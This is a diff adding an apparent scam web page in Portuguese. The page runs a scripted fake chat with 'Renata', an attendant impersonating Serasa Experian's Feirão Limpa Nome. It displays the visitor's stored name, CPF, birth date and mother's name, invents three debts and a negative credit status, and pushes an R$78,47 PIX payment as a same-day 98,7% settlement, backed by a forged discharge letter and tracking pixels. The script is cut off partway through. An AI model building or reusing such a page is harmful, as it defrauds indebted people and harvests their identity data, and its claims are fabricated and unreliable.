@@ -1,0 +1,980 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<!-- Utmify -->
+<script src="../js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async defer></script>
+<script>
+  window.googlePixelId = "69ca82f252d950fd07f2cc73";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "../js/pixel-google.js");
+  document.head.appendChild(a);
+</script><script async defer src="../js/pixel-google.js"></script>
+<!-- Fim Utmify -->
+<!-- xTracky e TikTok removidos -->
+<script src="../js/utmify-utm.js" defer></script>
+
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  
+  <title>Central - Atendimento</title>
+
+  <style>
+    :root {
+      --pink: #ec0978;
+      --pink-600: #d0086c;
+      --pink-50: #fff4fa;
+      --ink: #0f172a;
+      --sky: #f8fafc;
+      --footer: #1e2433;
+      --muted: #6b7280;
+      --radius: 16px;
+      --bubble-bot: #fff;
+      --bubble-user: #E80571;
+    }
+
+    *, ::before, ::after { box-sizing: border-box; margin: 0; padding: 0 }
+    html { height: 100% }
+    body {
+      min-height: 100%;
+      display: flex; flex-direction: column;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", sans-serif;
+      color: #111827;
+      background: var(--footer);
+      -webkit-font-smoothing: antialiased;
+    }
+
+    /* ===== Topbar ===== */
+    .topbar {
+      position: sticky; top: 0; z-index: 50;
+      background: var(--pink);
+      border-bottom: 1px solid rgba(0,0,0,.1);
+    }
+    .nav {
+      max-width: 1200px; margin: 0 auto; padding: 12px 20px;
+      display: flex; align-items: center; justify-content: space-between;
+    }
+    .brand { display: flex; align-items: center; gap: 10px }
+    .brand img { height: 40px; width: auto; display: block; filter: brightness(0) invert(1) }
+    .avatar { display: flex; align-items: center; gap: 8px }
+    .badge {
+      height: 36px; width: 36px; display: grid; place-items: center;
+      border-radius: 999px; background: rgba(255,255,255,.2); color: white;
+    }
+    .user-info { text-align: right; line-height: 1.3 }
+    .user-name-hdr { color: #fff; font-weight: 600; font-size: .85rem; white-space: nowrap }
+    .user-cpf-hdr { color: rgba(255,255,255,.7); font-size: .75rem; letter-spacing: .03em }
+
+    /* ===== Hero ===== */
+    .hero {
+      flex: 1;
+      padding: 24px 20px 16px;
+      background:
+        radial-gradient(ellipse 900px 500px at 65% -5%, rgba(236,9,120,.07) 0, transparent 70%),
+        radial-gradient(ellipse 600px 400px at 15% 20%, rgba(236,9,120,.04) 0, transparent 70%),
+        #f9fafb;
+    }
+    .shell { max-width: 900px; margin: 0 auto }
+
+    /* ===== Card ===== */
+    .card {
+      background: #fff;
+      border: 1px solid rgba(0,0,0,.06);
+      border-radius: var(--radius);
+      box-shadow: 0 1px 3px rgba(0,0,0,.04), 0 8px 32px rgba(236,9,120,.06);
+      overflow: hidden;
+    }
+    .card-head {
+      padding: 10px 16px;
+      display: flex; align-items: center; gap: 12px;
+      border-bottom: 1px solid rgba(0,0,0,.05);
+      background: linear-gradient(180deg, #fff 0%, #fffafd 100%);
+    }
+    .card-head-avatar {
+      width: 40px; height: 40px;
+      border-radius: 999px;
+      object-fit: cover;
+      flex-shrink: 0;
+      position: relative;
+    }
+    .card-head-avatar-wrap {
+      position: relative;
+      flex-shrink: 0;
+    }
+    .card-head-avatar-wrap .online-dot {
+      position: absolute;
+      bottom: 1px; right: 1px;
+      width: 10px; height: 10px;
+      border-radius: 999px;
+      background: #22c55e;
+      border: 2px solid #fff;
+    }
+    .card-head-info { flex: 1 }
+    .card-head-name { font-weight: 700; color: #111827; font-size: .9rem }
+    .card-head-status {
+      display: flex; align-items: center; gap: 5px;
+      font-size: .72rem; color: #22c55e; font-weight: 500;
+    }
+    .card-head-status::before {
+      content: "";
+      width: 6px; height: 6px;
+      border-radius: 999px;
+      background: #22c55e;
+      animation: pulse 2s ease-in-out infinite;
+    }
+    @keyframes pulse {
+      0%,100% { transform: scale(1); opacity: .4 }
+      50% { transform: scale(1.6); opacity: 0 }
+    }
+
+    /* ===== Chat container ===== */
+    .chat-wrap {
+      height: 70vh; min-height: 500px;
+      overflow-y: auto;
+      padding: 20px 16px;
+      background-color: #eae6df;
+      background-image: url('images/wallpaper.png');
+      background-repeat: repeat;
+      background-size: auto;
+      scroll-behavior: smooth;
+    }
+    .chat-wrap::-webkit-scrollbar { width: 6px }
+    .chat-wrap::-webkit-scrollbar-thumb { background: #b8b4ad; border-radius: 3px }
+
+    /* ===== Message groups ===== */
+    .msg-group {
+      display: flex; gap: 8px;
+      margin-bottom: 14px;
+      opacity: 0;
+      animation: msgIn .35s ease forwards;
+    }
+    .msg-group.user { justify-content: flex-end }
+    @keyframes msgIn {
+      from { opacity: 0; transform: translateY(10px) }
+      to { opacity: 1; transform: translateY(0) }
+    }
+
+    .msg-avatar-col {
+      width: 34px; flex-shrink: 0;
+      display: flex; align-items: flex-end;
+    }
+    .msg-avatar {
+      width: 34px; height: 34px;
+      border-radius: 999px;
+      object-fit: cover;
+    }
+    .msg-avatar-col.hidden { visibility: hidden }
+
+    .msg-col { max-width: 78%; display: flex; flex-direction: column; gap: 4px }
+
+    /* ===== Bubbles ===== */
+    .bubble {
+      padding: 10px 14px;
+      font-size: .9rem;
+      line-height: 1.55;
+      word-break: break-word;
+    }
+    .bubble.bot {
+      background: var(--bubble-bot);
+      color: #111827;
+      border-radius: 14px 14px 14px 4px;
+      box-shadow: 0 1px 4px rgba(0,0,0,.1);
+      border: 1px solid rgba(0,0,0,.04);
+    }
+    .bubble.bot.grouped { border-radius: 4px 14px 14px 4px }
+    .bubble.bot.last { border-radius: 4px 14px 14px 14px }
+    .bubble.bot.single { border-radius: 14px }
+    .bubble.user {
+      background: var(--bubble-user);
+      color: #fff;
+      border-radius: 14px 14px 4px 14px;
+      align-self: flex-end;
+    }
+    .bubble b, .bubble strong { font-weight: 700 }
+    .bubble .msg-time {
+      display: block;
+      text-align: right;
+      font-size: .58rem;
+      color: #a1a1aa;
+      margin-top: 4px;
+      line-height: 1;
+    }
+    .bubble.user .msg-time { color: rgba(255,255,255,.5) }
+    .bubble.img .msg-time,
+    .bubble.video-b .msg-time,
+    .bubble.embed .msg-time,
+    .bubble.audio-b .msg-time { display: none }
+
+    /* Image bubble */
+    .bubble.img {
+      padding: 4px;
+      background: #fff;
+      box-shadow: 0 1px 4px rgba(0,0,0,.1);
+      border: 1px solid rgba(0,0,0,.04);
+    }
+    .bubble.img img {
+      border-radius: 10px;
+      max-width: 100%;
+      display: block;
+    }
+
+    /* Embed bubble */
+    .bubble.embed {
+      padding: 4px;
+      background: #fff;
+      max-width: 100%; width: 100%;
+    }
+    .bubble.embed iframe {
+      border: none; border-radius: 10px;
+      width: 100%; display: block;
+    }
+
+    /* Audio bubble (WhatsApp style) */
+    .bubble.audio-b {
+      padding: 6px 10px;
+      background: #fff;
+      min-width: 240px;
+    }
+    .audio-player {
+      display: flex; align-items: center; gap: 10px;
+    }
+    .audio-btn {
+      width: 34px; height: 34px;
+      border-radius: 999px;
+      background: var(--pink);
+      border: none;
+      display: grid; place-items: center;
+      cursor: pointer;
+      flex-shrink: 0;
+      transition: background .15s;
+    }
+    .audio-btn:hover { background: var(--pink-600) }
+    .audio-btn svg { width: 16px; height: 16px }
+    .audio-wave {
+      flex: 1;
+      display: flex; align-items: center; gap: 1.5px;
+      height: 28px;
+    }
+    .audio-wave span {
+      display: block;
+      width: 3px;
+      border-radius: 2px;
+      background: #6b7280;
+      transition: background .2s;
+    }
+    .audio-wave.playing span { background: var(--pink) }
+    .audio-time {
+      font-size: .65rem;
+      color: #6b7280;
+      min-width: 32px;
+      text-align: right;
+      font-variant-numeric: tabular-nums;
+    }
+
+    /* Video bubble */
+    .bubble.video-b {
+      padding: 4px;
+      background: #fff;
+      max-width: 320px;
+    }
+    .bubble.video-b iframe {
+      border: none; border-radius: 10px;
+      width: 100%; aspect-ratio: 9/16;
+    }
+
+    /* ===== Data confirmation card ===== */
+    .data-card {
+      background: #fff;
+      border-radius: 12px;
+      border: 1px solid rgba(0,0,0,.04);
+      box-shadow: 0 1px 4px rgba(0,0,0,.1);
+      overflow: hidden;
+      max-width: 280px;
+    }
+    .data-card-header {
+      text-align: center;
+      padding: 12px 16px 10px;
+      border-bottom: 2px solid var(--pink);
+    }
+    .data-card-header img { height: 30px; margin: 0 auto }
+    .data-card-body { padding: 10px 14px 14px }
+    .data-card-alert {
+      font-size: .75rem;
+      color: #4b5563;
+      background: #f9fafb;
+      border: 1px solid #f3f4f6;
+      border-radius: 8px;
+      padding: 8px 10px;
+      margin-bottom: 10px;
+      line-height: 1.5;
+    }
+    .data-card-field {
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      padding: 8px 10px;
+      margin-bottom: 6px;
+    }
+    .data-card-label { font-size: .65rem; color: #9ca3af; margin-bottom: 2px }
+    .data-card-value { font-size: .82rem; font-weight: 700; color: #111827 }
+    .data-card-value.score { color: #dc2626 }
+    .data-card-footer {
+      text-align: center;
+      padding: 8px 14px;
+      border-top: 2px solid var(--pink);
+      font-size: .68rem;
+      color: #9ca3af;
+    }
+
+    /* ===== Proof card (carta de quitação) ===== */
+    .proof-card {
+      background: #f7d6e5;
+      border-radius: 12px;
+      border: 1px solid rgba(0,0,0,.04);
+      box-shadow: 0 1px 4px rgba(0,0,0,.1);
+      overflow: hidden;
+      max-width: 290px;
+      padding: 14px;
+      font-size: .78rem;
+      color: #2e2c2c;
+      line-height: 1.5;
+    }
+    .proof-card-logo {
+      text-align: center;
+      margin-bottom: 10px;
+    }
+    .proof-card-logo svg { display: inline-block }
+    .proof-card h3 {
+      font-size: .9rem; font-weight: 700; color: #222;
+      margin-bottom: 8px;
+    }
+    .proof-card p { margin-bottom: 8px }
+    .proof-card ul {
+      margin: 0 0 8px 16px;
+      list-style: disc;
+    }
+    .proof-card li { margin-bottom: 3px }
+    .proof-card h4 {
+      font-size: .82rem; font-weight: 700; color: #222;
+      margin: 10px 0 6px;
+    }
+    .proof-card-sig {
+      margin-top: 12px;
+      padding-top: 8px;
+      border-top: 1px solid rgba(0,0,0,.1);
+      font-size: .72rem;
+      color: #555;
+      font-style: italic;
+    }
+    .proof-card-copy {
+      margin-top: 8px;
+      font-size: .65rem;
+      color: #888;
+      text-align: center;
+    }
+
+    /* ===== Typing indicator ===== */
+    .typing-group {
+      display: flex; gap: 8px; align-items: flex-end;
+      margin-bottom: 14px;
+    }
+    .typing-dots {
+      display: flex; gap: 4px;
+      padding: 12px 16px;
+      background: #fff;
+      border-radius: 14px 14px 14px 4px;
+      box-shadow: 0 1px 4px rgba(0,0,0,.1);
+      border: 1px solid rgba(0,0,0,.04);
+    }
+    .typing-dots span {
+      width: 7px; height: 7px;
+      border-radius: 999px;
+      background: #94a3b8;
+      animation: bounce 1.2s infinite;
+    }
+    .typing-dots span:nth-child(2) { animation-delay: .2s }
+    .typing-dots span:nth-child(3) { animation-delay: .4s }
+    @keyframes bounce {
+      0%,60%,100% { transform: translateY(0) }
+      30% { transform: translateY(-6px) }
+    }
+
+    /* ===== Choice buttons ===== */
+    .choices-wrap {
+      display: flex; justify-content: flex-end;
+      margin-bottom: 14px;
+      opacity: 0;
+      animation: msgIn .35s ease forwards;
+    }
+    .choice-btn {
+      background: var(--bubble-user);
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 14px;
+      font-size: .9rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: transform .15s, box-shadow .15s;
+      box-shadow: 0 2px 8px rgba(232,5,113,.2);
+    }
+    .choice-btn:hover { transform: scale(1.03); box-shadow: 0 4px 12px rgba(232,5,113,.3) }
+    .choice-btn:active { transform: scale(.97) }
+
+    /* ===== Footer ===== */
+    footer {
+      background: var(--footer);
+      color: #94a3b8;
+      font-size: .8rem;
+    }
+    .foot {
+      max-width: 1200px; margin: 0 auto; padding: 14px 20px;
+      display: flex; align-items: center; justify-content: center; gap: 10px; flex-wrap: wrap;
+    }
+    .foot-logo { height: 20px; width: auto; opacity: .7 }
+    .foot-sep { opacity: .4 }
+    .foot a { color: #cbd5e1; text-decoration: none; transition: color .2s }
+    .foot a:hover { color: #fff }
+
+    @media (max-width: 920px) {
+      .hero { padding: 20px 12px 32px }
+      .shell { max-width: 100% }
+      .chat-wrap { height: 75vh; min-height: 480px; padding: 16px 10px }
+      .msg-col { max-width: 85% }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== TOPBAR ===== -->
+  <header class="topbar">
+    <div class="nav">
+      <div class="brand">
+        <img src="images/logo.png" alt="Logo" onerror="this.style.display='none'">
+      </div>
+      <div class="avatar">
+        <div class="user-info">
+          <div class="user-name-hdr" id="user-display-name"></div>
+          <div class="user-cpf-hdr" id="user-display-cpf"></div>
+        </div>
+        <div class="badge">
+          <svg width="18" height="18" viewBox="0 0 24 24" fill="none">
+            <circle cx="12" cy="8.5" r="3.2" fill="#ffffff"></circle>
+            <path d="M4.5 19.5c0-3.2 3.4-5.2 7.5-5.2s7.5 2 7.5 5.2v.3H4.5v-.3z" fill="#ffffff"></path>
+          </svg>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <!-- ===== MAIN ===== -->
+  <main class="hero">
+    <div class="shell">
+      <section class="card">
+        <div class="card-head">
+          <div class="card-head-avatar-wrap">
+            <img class="card-head-avatar" src="images/atendente.png" alt="Renata">
+            <span class="online-dot"></span>
+          </div>
+          <div class="card-head-info">
+            <div class="card-head-name">Renata Almeida - Atendente</div>
+            <div class="card-head-status">Online</div>
+          </div>
+        </div>
+        <div class="chat-wrap" id="chat"></div>
+      </section>
+    </div>
+  </main>
+
+  <!-- ===== FOOTER ===== -->
+  <footer>
+    <div class="foot">
+      <img src="images/logo.png" alt="Logo" class="foot-logo">
+      <span>© <span id="y">2026</span> Central</span>
+      <span class="foot-sep">·</span>
+      <a href="index.html#">Privacidade</a>
+      <span class="foot-sep">·</span>
+      <a href="index.html#">Termos</a>
+    </div>
+  </footer>
+
+  <!-- ===== SCRIPTS ===== -->
+  <script>
+    document.getElementById('y').textContent = new Date().getFullYear();
+
+    // User data
+    var userName = localStorage.getItem('userName') || 'Cliente';
+    var userCPF = localStorage.getItem('userCPF') || '';
+    var userBirth = localStorage.getItem('userBirth') || '';
+    var userMother = localStorage.getItem('userMother') || '';
+
+    (function() {
+      if (userName && userName !== 'Cliente') {
+        var p = userName.trim().split(/\s+/);
+        document.getElementById('user-display-name').textContent = p.length > 1 ? p[0] + ' ' + p[p.length-1] : p[0];
+      }
+      if (userCPF) {
+        var l = userCPF.replace(/\D/g, '');
+        document.getElementById('user-display-cpf').textContent = l.slice(0,3) + '.\u2022\u2022\u2022.\u2022\u2022\u2022-' + l.slice(-2);
+      }
+    })();
+
+    // ===== Chat Engine =====
+    var chat = document.getElementById('chat');
+    var avatarUrl = 'images/atendente.png';
+    var steps = [];
+    var lastSender = '';
+    var chatStartTime = new Date();
+    var msgCount = 0;
+
+    function getTime() {
+      // Simula horário avançando ~30s por mensagem a partir da hora real de início
+      var t = new Date(chatStartTime.getTime() + msgCount * 30000);
+      msgCount++;
+      return t.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+    }
+
+    function scroll() { chat.scrollTop = chat.scrollHeight }
+
+    // Show typing indicator
+    function showTyping() {
+      hideTyping();
+      var el = document.createElement('div');
+      el.className = 'typing-group';
+      el.id = 'typing-ind';
+      el.innerHTML =
+        '<div class="msg-avatar-col"><img class="msg-avatar" src="' + avatarUrl + '"></div>' +
+        '<div class="typing-dots"><span></span><span></span><span></span></div>';
+      chat.appendChild(el);
+      scroll();
+    }
+    function hideTyping() {
+      var t = document.getElementById('typing-ind');
+      if (t) t.remove();
+    }
+
+    // Add a bot message group (avatar only on first of consecutive bot messages)
+    function addBot(contentHtml, extraClass) {
+      hideTyping();
+      var showAvatar = (lastSender !== 'bot');
+      var group = document.createElement('div');
+      group.className = 'msg-group';
+
+      var avCol = document.createElement('div');
+      avCol.className = 'msg-avatar-col' + (showAvatar ? '' : ' hidden');
+      avCol.innerHTML = '<img class="msg-avatar" src="' + avatarUrl + '">';
+
+      var col = document.createElement('div');
+      col.className = 'msg-col';
+
+      var bubble = document.createElement('div');
+      bubble.className = 'bubble bot' + (extraClass ? ' ' + extraClass : '');
+      bubble.innerHTML = contentHtml + '<span class="msg-time">' + getTime() + '</span>';
+
+      col.appendChild(bubble);
+      group.appendChild(avCol);
+      group.appendChild(col);
+      chat.appendChild(group);
+      lastSender = 'bot';
+      scroll();
+    }
+
+    function addBotText(html) { addBot(html); }
+    function addBotImage(url) { addBot('<img src="' + url + '" alt="">', 'img'); }
+    function addBotEmbed(url, h) { addBot('<iframe src="' + url + '" height="' + h + '"></iframe>', 'embed'); }
+    function addBotAudio(url) {
+      var id = 'ap-' + Math.random().toString(36).substr(2,6);
+      // Generate random wave bar heights
+      var bars = '';
+      for (var i = 0; i < 28; i++) {
+        var h = Math.floor(Math.random() * 20) + 6;
+        bars += '<span style="height:' + h + 'px"></span>';
+      }
+      var html = '<div class="audio-player" id="' + id + '">' +
+        '<button class="audio-btn" data-playing="0">' +
+          '<svg class="play-icon" viewBox="0 0 24 24" fill="#fff"><polygon points="6,3 20,12 6,21"/></svg>' +
+          '<svg class="pause-icon" viewBox="0 0 24 24" fill="#fff" style="display:none"><rect x="5" y="3" width="4" height="18"/><rect x="15" y="3" width="4" height="18"/></svg>' +
+        '</button>' +
+        '<div class="audio-wave">' + bars + '</div>' +
+        '<div class="audio-time">0:00</div>' +
+        '<audio preload="metadata" src="' + url + '"></audio>' +
+      '</div>';
+      addBot(html, 'audio-b');
+
+      // Wire up player
+      setTimeout(function() {
+        var wrap = document.getElementById(id);
+        if (!wrap) return;
+        var btn = wrap.querySelector('.audio-btn');
+        var audio = wrap.querySelector('audio');
+        var wave = wrap.querySelector('.audio-wave');
+        var timeEl = wrap.querySelector('.audio-time');
+        var playIcon = wrap.querySelector('.play-icon');
+        var pauseIcon = wrap.querySelector('.pause-icon');
+
+        function fmt(s) {
+          var m = Math.floor(s/60);
+          var sec = Math.floor(s%60);
+          return m + ':' + (sec<10?'0':'') + sec;
+        }
+
+        audio.addEventListener('loadedmetadata', function() {
+          timeEl.textContent = fmt(audio.duration);
+          
+          var playPromise = audio.play();
+          if (playPromise !== undefined) {
+            playPromise.then(function() {
+              playIcon.style.display = 'none';
+              pauseIcon.style.display = '';
+              btn.dataset.playing = '1';
+            }).catch(function(err) {
+              console.log("Autoplay bloqueado pelo navegador:", err);
+            });
+          }
+        });
+
+        audio.addEventListener('timeupdate', function() {
+          timeEl.textContent = fmt(audio.currentTime);
+          // Animate wave progress
+          var pct = audio.duration ? (audio.currentTime / audio.duration) : 0;
+          var spans = wave.querySelectorAll('span');
+          var active = Math.floor(pct * spans.length);
+          for (var j = 0; j < spans.length; j++) {
+            spans[j].style.background = j < active ? '#ec0978' : '#6b7280';
+          }
+        });
+
+        audio.addEventListener('ended', function() {
+          playIcon.style.display = '';
+          pauseIcon.style.display = 'none';
+          btn.dataset.playing = '0';
+          var spans = wave.querySelectorAll('span');
+          for (var j = 0; j < spans.length; j++) spans[j].style.background = '#6b7280';
+          timeEl.textContent = fmt(audio.duration);
+        });
+
+        btn.addEventListener('click', function() {
+          if (btn.dataset.playing === '0') {
+            audio.play();
+            playIcon.style.display = 'none';
+            pauseIcon.style.display = '';
+            btn.dataset.playing = '1';
+          } else {
+            audio.pause();
+            playIcon.style.display = '';
+            pauseIcon.style.display = 'none';
+            btn.dataset.playing = '0';
+          }
+        });
+      }, 100);
+    }
+    function addBotVideo(ytId) { addBot('<iframe src="https://www.youtube.com/embed/' + ytId + '?autoplay=1" allowfullscreen allow="autoplay"></iframe>', 'video-b'); }
+
+    function addDataCard() {
+      var cpfFmt = userCPF ? userCPF.replace(/\D/g,'').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4') : 'N\u00e3o informado';
+      var html = '<div class="data-card">' +
+        '<div class="data-card-header"><img src="images/logo-data.png" alt="Serasa"></div>' +
+        '<div class="data-card-body">' +
+          '<div class="data-card-alert">Revise seus dados abaixo e confirme agora para limpar seu nome e recuperar seu acesso ao cr\u00e9dito no mercado.</div>' +
+          '<div class="data-card-field"><div class="data-card-label">Nome completo</div><div class="data-card-value">' + (userName || 'N\u00e3o informado') + '</div></div>' +
+          '<div class="data-card-field"><div class="data-card-label">CPF</div><div class="data-card-value">' + cpfFmt + '</div></div>' +
+          '<div class="data-card-field"><div class="data-card-label">Data de nascimento</div><div class="data-card-value">' + (userBirth || 'N\u00e3o informado') + '</div></div>' +
+          '<div class="data-card-field"><div class="data-card-label">Nome da m\u00e3e</div><div class="data-card-value">' + (userMother || 'N\u00e3o informado') + '</div></div>' +
+          '<div class="data-card-field"><div class="data-card-label">Score</div><div class="data-card-value score">129 Pontos - Baixo</div></div>' +
+        '</div>' +
+        '<div class="data-card-footer">Feir\u00e3o Limpa Nome - Serasa Experian</div>' +
+      '</div>';
+      addBot(html);
+    }
+
+    function sDataCard() {
+      s(function(next) {
+        showTyping();
+        setTimeout(function() { addDataCard(); next() }, 1500);
+      });
+    }
+
+    function addProofCard() {
+      var hoje = new Date().toLocaleDateString('pt-BR');
+      var html = '<div class="proof-card">' +
+        '<div class="proof-card-logo"><svg width="120" height="30" viewBox="0 0 180 50" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M30 10H150C155.523 10 160 14.4772 160 20V30C160 35.5228 155.523 40 150 40H30C24.4772 40 20 35.5228 20 30V20C20 14.4772 24.4772 10 30 10Z" fill="#C71585"/><text x="90" y="30" font-family="Arial" font-size="16" fill="white" text-anchor="middle">SERASA</text></svg></div>' +
+        '<h3>Carta de Quita\u00e7\u00e3o</h3>' +
+        '<p>Na qualidade de Serasa, com base na presta\u00e7\u00e3o de servi\u00e7os realizados ao Sr./Sra. <b>' + userName + '</b>, portador(a) do CPF <b>' + cpfFmt() + '</b>, informamos que:</p>' +
+        '<ul><li>O servi\u00e7o ser\u00e1 realizado com base no programa do Feir\u00e3o Limpa Nome, onde o(a) mesmo(a) obteve um desconto de <b>98,7%</b> na quita\u00e7\u00e3o de todos os d\u00e9bitos em aberto.</li></ul>' +
+        '<h4>Detalhes da d\u00edvida</h4>' +
+        '<ul>' +
+          '<li>Acordo: Gerido e processado pela Serasa.</li>' +
+          '<li>Valor total: R$ <b>78,47</b>.</li>' +
+          '<li>Forma de pagamento: PIX.</li>' +
+          '<li>Acordo v\u00e1lido somente hoje: <b>' + hoje + '</b></li>' +
+        '</ul>' +
+        '<p>Agora, depois que a Serasa Experian recebeu o pagamento devido, declaro aqui a quita\u00e7\u00e3o completa e absoluta da d\u00edvida.</p>' +
+        '<div class="proof-card-sig">Renata Paiva de Almeida<br>Encarregada de Negocia\u00e7\u00f5es<br>Serasa Experian</div>' +
+        '<div class="proof-card-copy">\u00a9 2026 Serasa Experian. Todos os direitos reservados.</div>' +
+      '</div>';
+      addBot(html);
+    }
+
+    function sProofCard() {
+      s(function(next) {
+        showTyping();
+        setTimeout(function() { addProofCard(); next() }, 1500);
+      });
+    }
+
+    function addUser(text) {
+      hideTyping();
+      var group = document.createElement('div');
+      group.className = 'msg-group user';
+      var col = document.createElement('div');
+      col.className = 'msg-col';
+      var bubble = document.createElement('div');
+      bubble.className = 'bubble user';
+      bubble.innerHTML = text + '<span class="msg-time">' + getTime() + '</span>';
+      col.appendChild(bubble);
+      group.appendChild(col);
+      chat.appendChild(group);
+      lastSender = 'user';
+      scroll();
+    }
+
+    function addChoice(label, cb) {
+      hideTyping();
+      lastSender = '';
+      var wrap = document.createElement('div');
+      wrap.className = 'choices-wrap';
+      var btn = document.createElement('button');
+      btn.className = 'choice-btn';
+      btn.textContent = label;
+      btn.onclick = function() {
+        wrap.remove();
+        addUser(label);
+        setTimeout(cb, 500);
+      };
+      wrap.appendChild(btn);
+      chat.appendChild(wrap);
+      scroll();
+    }
+
+    // Step queue
+    function s(fn) { steps.push(fn) }
+
+    // Typing delay proportional to text length (min 1.2s, max 3s)
+    function typingDelay(html) {
+      var text = html ? html.replace(/<[^>]*>/g, '') : '';
+      var d = Math.min(Math.max(text.length * 25, 1200), 3000);
+      return d;
+    }
+
+    function sText(html) {
+      s(function(next) {
+        showTyping();
+        setTimeout(function() { addBotText(html); next() }, typingDelay(html));
+      });
+    }
+    function sImage(url) {
+      s(function(next) {
+        showTyping();
+        setTimeout(function() { addBotImage(url); next() }, 1200);
+      });
+    }
+    function sEmbed(url, h) {
+      s(function(next) {
+        showTyping();
+        setTimeout(function() { addBotEmbed(url, h); next() }, 1500);
+      });
+    }
+    function sAudio(url) {
+      s(function(next) {
+        showTyping();
+        setTimeout(function() { addBotAudio(url); next() }, 1200);
+      });
+    }
+    function sVideo(ytId) {
+      s(function(next) {
+        showTyping();
+        setTimeout(function() { addBotVideo(ytId); next() }, 1200);
+      });
+    }
+    function sWait(ms) {
+      s(function(next) { setTimeout(next, ms) });
+    }
+    function sPause() {
+      // Small pause between message groups to feel natural
+      s(function(next) { lastSender = ''; setTimeout(next, 800) });
+    }
+    function sChoice(label, nextFn) {
+      s(function() {
+        addChoice(label, function() { nextFn(); run() });
+      });
+    }
+
+    function run() {
+      if (!steps.length) return;
+      var fn = steps.shift();
+      if (fn.length === 0) { fn(); run() }
+      else { fn(function() { run() }) }
+    }
+
+    // ===== FLOW =====
+    function cpfFmt() {
+      if (!userCPF) return '---';
+      var l = userCPF.replace(/\D/g, '');
+      return l.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+    }
+
+    function start() {
+      // Imagem de boas-vindas
+      sImage('images/1.gif');
+
+      sPause();
+
+      // Atendente entra
+      sText('Ol\u00e1, ' + userName + '. Sou <b>Renata</b>, sua atendente da Serasa. <b>Seja bem-vindo(a) ao canal oficial de atendimento</b>.');
+
+      sPause();
+      sWait(2000);
+
+      sText('Consulte gr\u00e1tis as ofertas dispon\u00edveis especialmente para voc\u00ea!');
+
+      sPause();
+
+      sText('Estamos <b>conferindo seus dados</b>. Por favor, <b>aguarde um instante</b>..');
+
+      sWait(3000);
+
+      sImage('images/2.gif');
+
+      sPause();
+
+      sText('<b>Dados verificados com sucesso!</b> Pode seguir para a pr\u00f3xima etapa.');
+
+      sWait(2000);
+
+      sDataCard();
+
+      sWait(3000);
+      sPause();
+
+      sText('<b>Seus dados est\u00e3o seguros</b> e ser\u00e3o usados <b>exclusivamente para consulta</b>.');
+
+      sChoice('Continuar', group5);
+    }
+
+    function group5() {
+      sText(userName + ', <b>seja bem-vindo(a)</b> ao atendimento do <b>Feir\u00e3o Limpa Nome da Serasa</b>.');
+      sText('<b>Protocolo do atendimento</b>: AMY3PK8JS');
+
+      sWait(2000);
+      sPause();
+
+      sImage('images/3.gif');
+
+      sPause();
+
+      sText('<b>\u00daltimo dia do Feir\u00e3o Online Serasa Limpa Nome!</b> Deseja <b>consultar as ofertas dispon\u00edveis</b> para o seu CPF?');
+
+      sChoice('Sim, consultar', group7);
+    }
+
+    function group7() {
+      sText('Por favor, <b>aguarde</b> enquanto <b>analisamos a situa\u00e7\u00e3o do seu CPF</b> em nosso sistema...');
+
+      sImage('images/4.gif');
+
+      sWait(5000);
+      sPause();
+
+      sText(userName + ', identificamos <b>3 d\u00edvidas ativas</b> no sistema.<br><br>Os valores variam entre <b>R$528,74</b> e <b>R$5.237,78</b>, totalizando uma <b>d\u00edvida ativa de R$7.566,52</b> em seu CPF.<br><br><b>Situa\u00e7\u00e3o para o CPF ' + cpfFmt() + ': NEGATIVADO</b>');
+
+      sWait(3000);
+      sPause();
+
+      sAudio('media/audio1.mp3');
+
+      sWait(10000);
+      sPause();
+
+      sImage('images/5.gif');
+
+      sPause();
+
+      sText('Deseja <b>verificar se h\u00e1 algum acordo dispon\u00edvel</b> para voc\u00ea?');
+
+      sChoice('Verificar acordo', group9);
+    }
+
+    function group9() {
+      sText('<b>Aguarde um instante</b> enquanto verificamos no sistema se <b>h\u00e1 acordos dispon\u00edveis para voc\u00ea</b>...');
+
+      sWait(3000);
+
+      sImage('images/6.gif');
+
+      sPause();
+
+      sText('<b>Not\u00edcia</b>: Somente hoje, <b>mais de 12.872 brasileiros</b> j\u00e1 negociaram suas d\u00edvidas no <b>Feir\u00e3o Limpa Nome Serasa Online</b>.');
+
+      sWait(3000);
+      sPause();
+
+      sVideo('_McElcgX7R8');
+
+      sWait(10000);
+      sPause();
+
+      sText('<b>Acordo encontrado! 1 (um) acordo</b> foi localizado para <b>' + userName + '</b>, CPF: <b>' + cpfFmt() + '</b>.');
+
+      sText('Informa\u00e7\u00f5es do acordo <b>83N2L618362E</b>:<br><br><b>Acordo</b>: 83N2L618362E<br><b>Valor total da d\u00edvida:</b> R$7.566,52<br><b>Valor do contrato</b>: R$78,47<br><b>Desconto total</b>: 98,7% (<b>R$7.488,05</b>)<br><br>\u26a0\ufe0f Este contrato \u00e9 <b>v\u00e1lido apenas para o titular</b>: <b>' + userName + '</b>, CPF <b>' + cpfFmt() + '</b>.');
+
+      sWait(3000);
+      sPause();
+
+      sImage('images/7.gif');
+
+      sAudio('media/audio2.mp3');
+
+      sWait(23000);
+      sPause();
+
+      sText('Deseja realizar o acordo e ter seu nome limpo ainda hoje?');
+
+      sChoice('Sim, quero quitar minhas d\u00edvidas', group11);
+    }
+
+    function group11() {
+      sText('Confirmando acordo, aguarde...');
+
+      sWait(3000);
+      sPause();
+
+      sText('<b>SERASA INFORMA</b>: Ao efetuar o pagamento do acordo, <b>todas as d\u00edvidas em aberto</b> no CPF <b>' + cpfFmt() + '</b> ser\u00e3o <b>removidas em at\u00e9 1 hora</b>, e voc\u00ea ter\u00e1 <b>seu nome limpo novamente!</b>');
